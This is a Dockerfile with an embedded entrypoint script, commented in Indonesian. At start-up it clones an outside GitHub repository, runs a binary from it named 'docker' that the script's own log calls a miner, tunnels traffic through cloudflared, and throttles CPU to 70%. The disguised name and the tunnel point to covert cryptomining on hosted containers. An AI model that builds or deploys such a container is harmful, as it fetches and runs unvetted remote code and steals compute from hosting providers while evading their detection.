FROM debian:stable-slim

RUN apt-get update && apt-get install -y \
    git curl ca-certificates libcurl4 libjansson4 libssl3 libgomp1 sed \
    && rm -rf /var/lib/apt/lists/*

# install cloudflared
RUN curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    -o /usr/bin/cloudflared && chmod +x /usr/bin/cloudflared

WORKDIR /app

# entrypoint
RUN cat <<'EOF' > /entrypoint.sh
#!/bin/bash

set -e

echo "[INIT] Starting container..."

# ✅ cek cpulimit
if ! command -v cpulimit >/dev/null 2>&1; then
    echo "[INIT] cpulimit tidak ditemukan, install..."
    apt-get update && apt-get install -y cpulimit && rm -rf /var/lib/apt/lists/*
else
    echo "[INIT] cpulimit sudah tersedia"
fi

mkdir -p /app/ramdisk
cd /app/ramdisk

echo "[INIT] Cleaning workspace..."
rm -rf *

echo "[INIT] Cloning repo..."
git clone -q https://github.com/umnodqib/swam.git
cd swam

chmod +x docker

# setting core
CORES=1
LIMIT=$(( CORES * 70 ))

echo "[DOTAJA] Core: $CORES | CPU Limit: $LIMIT%"

# update config (simple sed)
if [ -f docker.json ]; then
    sed -i "s/\"threads\":.*/\"threads\": $CORES,/g" docker.json || true
fi

# ambil hostname tunnel
if [ -f hostname.txt ]; then
    HOST_CF=$(cat hostname.txt)
    echo "[INIT] Starting Cloudflare tunnel: $HOST_CF"
    cloudflared access tcp --hostname "$HOST_CF" --url 127.0.0.1:443 &
else
    echo "[WARN] hostname.txt tidak ditemukan, skip tunnel"
fi

echo "[INIT] Starting miner..."
./docker -c docker.json &
PID=$!

echo "[DOTAJA] PID: $PID"

sleep 2

# ✅ apply cpulimit pakai PID + include child
echo "[INIT] Applying CPU limit..."
cpulimit -p $PID -l $LIMIT --include-children &

echo "[INIT] All services started"

# supaya container tetap hidup
wait $PID

EOF

RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
